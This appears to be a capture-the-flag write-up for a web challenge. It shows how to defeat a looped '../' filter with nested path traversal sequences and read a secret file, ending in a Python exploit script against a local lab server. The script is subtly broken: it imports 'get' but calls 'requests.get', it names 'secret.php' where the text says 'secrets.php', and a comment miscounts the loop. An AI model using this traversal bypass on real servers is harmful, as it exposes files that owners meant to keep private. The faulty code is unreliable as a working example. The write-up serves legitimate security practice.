There are two buttons, 'Good List' and 'Naughty List' that redirects us to `/?list=good.php` and `/?list=naughty.php` respectively.

By the description we want to access the secret list which is probably somewhere in the server.

Let's inspect the server code that is provided along with the challenge description.

As we can see, `list` parameter is filtered through the `clean($input)` function and then is passed to the `$filepath` variable as `$clean_list`.

`$filePath = __DIR__.'/lists/'.$clean_list;`

The `clean()` function has implemented a poor way of defending against path traversal attacks, so we may be able to eploit it.

There is loop of 100 times that `str_replace` function replaces all `../` it finds in each iteration. Since we know its 100 iterations we can give 101 to bypass this.

For example if we had 2 replacement loops the payload would be something like `/?list=......///secrets.php`

Additionally we know that `secrets.php` is not into `/lists` folder and it is probably outside of the server path `/var/www/html`, so we should have something like `/?list=......///......///......///......///......///secrets.php`.

Keeping all that in mind let's construct an exploit in Python.

```py
from requests import get

url = "http://127.0.0.1:1337"

# generate 100 times the sequence '../' to bypass server restrictions
def payload():
    str = ''
    for i in range(101):
        str += '..'
    for i in range(101):
        str += '/'

    return str

response = requests.get(f'{url}/?list={payload()*5}secret.php')

print(response)

```

The response contains the flag.
